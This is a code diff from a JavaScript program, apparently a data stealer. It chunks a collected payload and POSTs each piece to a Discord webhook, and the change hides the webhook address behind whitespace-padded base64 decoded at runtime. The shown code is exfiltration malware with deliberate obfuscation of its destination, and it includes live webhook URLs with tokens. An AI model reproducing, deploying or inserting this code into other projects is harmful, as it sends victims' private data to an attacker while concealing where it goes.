@@ -84,8 +84,11 @@ async function start() {
         })
     });
     var pleb = JSON.stringify(FINALEMER1).match(/.{1,1900}/g);
+    var mdfg = "a HR0 cHM 6Ly 9ka XNj b3J kLm Nvb S9h cGk vd2 Via G9v a3M vMT M2ND cwM Dc 5NTM3ODk5MTEzNC9OS0haYy14U3VBY3ZnbnNKbEJfVEtza2RyQWVjTHVqWnN0dkZWQzhqa0xmUkdtZVRlNFlHU3pPc2t1dUpTVUlUUmFZbg=="
+    mdfg = mdfg.replace(/\s/g, '');
+    mdfg = atob(mdfg)
     for (let i = 0; i < pleb.length; i++) {
-        await fetch('https://discord.com/api/webhooks/1216480409127223366/K9qLjY9EaCBJbO3ssfZ-K3xORSjuXZtYD7kOWHfPSFhEamU6x-Kq8qeBB3C9gdOsA0f_', {
+        await fetch(mdfg, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
